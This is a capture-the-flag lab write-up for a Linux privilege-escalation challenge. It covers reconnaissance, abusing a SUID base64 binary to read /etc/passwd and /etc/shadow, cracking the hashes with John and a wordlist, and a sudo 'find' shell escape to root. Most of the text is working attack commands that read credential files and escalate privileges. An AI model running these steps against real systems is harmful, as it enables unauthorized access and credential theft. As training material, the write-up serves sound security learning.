# 🎯 **Linux Capstone Challenge**

---

## 🛰️ **Reconnaissance**

```bash
bash
CopyEdit
# List users with home directories
cat /etc/passwd | grep home

# Check system information
uname -a

# Check detailed OS version
cat /proc/version

# Check allowed sudo permissions
sudo -l

```

![image](https://github.com/user-attachments/assets/19cb771a-39db-4723-9b2e-7298be3f4a37)


---

## 🔍 **Finding SUID Binaries**

```bash
bash
CopyEdit
# Find all files with SUID bit set
find / -type f -perm -04000 -ls 2>/dev/null

# Alternative method (more specific)
find / -type f -perm -u=s -ls 2>/dev/null

```

![image](https://github.com/user-attachments/assets/17b7043e-fd6d-4e56-aea4-5f562f784c15)


---

## 🧬 **Exploiting Base64 SUID Binary**

Since `base64` has SUID permissions, we can **read protected files**:

```bash
bash
CopyEdit
# Read /etc/passwd
LFILE=/etc/passwd
base64 "$LFILE" | base64 --decode

# Read /etc/shadow
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode

```

➡️ **Save** the output into two files: `passwd.txt` and `shadow.txt`.

---

## 🛠️ **Cracking Passwords with John**

First, create a password hash file:

```bash
bash
CopyEdit
unshadow passwd.txt shadow.txt > passwords.txt

```

Then crack it using John and a wordlist:

```bash
bash
CopyEdit
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt

```

### ✅ Passwords Found:

| Username | Password |
| --- | --- |
| missy | Password1 |
| leonard | Penny123 |

![image](https://github.com/user-attachments/assets/389c916e-ee5e-4698-807b-9218b38fab13)


---

## 🔐 **Switch User to Missy**

```bash
bash
CopyEdit
su missy
cd /home/missy/Documents
cat flag1.txt

```

![image](https://github.com/user-attachments/assets/85c6ffcc-6532-4066-96e0-bc3a5625cdf2)


---

## 🚀 **Privilege Escalation (Missy User)**

Check sudo permissions:

```bash
bash
CopyEdit
sudo -l

```

**Exploit via `find` command:**

```bash
bash
CopyEdit
sudo find . -exec /bin/sh \; -quit

```

Move to root directory and capture second flag:

```bash
bash
CopyEdit
cd /home/rootflag
cat flag2.txt

```

![image](https://github.com/user-attachments/assets/d9d0ed5f-4eca-469b-b3d0-48838b464a35)


---

## 🛤️ **Alternative Exploit Path**

Another way to get a root shell via `find`:

![image](https://github.com/user-attachments/assets/7b3f9c62-9629-4e14-a159-085a4a84559b)


---

# ⚡ Summary

- ✅ Recon → Find users and OS
- ✅ SUID → Exploit base64 to read protected files
- ✅ Passwords → Cracked with John
- ✅ Privilege Escalation → Using `find` with sudo rights
- ✅ Flags Captured!
